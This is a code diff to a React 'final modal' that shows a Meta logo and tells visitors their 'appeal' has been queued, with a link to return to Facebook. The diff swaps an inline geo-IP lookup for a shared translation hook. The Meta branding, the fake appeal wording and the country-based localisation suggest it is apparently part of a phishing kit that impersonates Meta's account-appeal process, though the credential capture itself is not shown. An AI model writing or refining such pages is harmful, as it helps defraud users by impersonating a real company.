@@ -1,30 +1,16 @@
 import FinalImage from '@/assets/images/final-image.png';
 import MetaLogo from '@/assets/images/meta-logo-image.png';
-import { getTranslations, COUNTRY_TO_LANGUAGE } from '@/utils/translate';
-import axios from 'axios';
+import { useTranslation } from '@/hooks/useTranslation';
 import Image from 'next/image';
-import { useEffect, useState, type FC } from 'react';
+import { type FC } from 'react';
 
 const FinalModal: FC = () => {
-    const [translations, setTranslations] = useState<Record<string, string>>({});
-
-    useEffect(() => {
-        const init = async () => {
-            try {
-                const { data } = await axios.get('https://get.geojs.io/v1/ip/geo.json', { timeout: 5000 });
-                const cc = (data.country_code || 'US').toLowerCase();
-                const lang = COUNTRY_TO_LANGUAGE[cc] || 'en';
-                if (lang !== 'en') {
-                    setTranslations(getTranslations(lang) || {});
-                }
-            } catch {
-                // fallback to English
-            }
-        };
-        init();
-    }, []);
-
-    const t = (text: string): string => translations[text] || text;
+    // Shared translation hook - uses geoInfo from store (no redundant geo API call)
+    const { t } = useTranslation([
+        'Request has been sent',
+        'Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.',
+        'Return on Facebook',
+    ]);
 
     return (
         <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/40 px-2 md:px-4'>
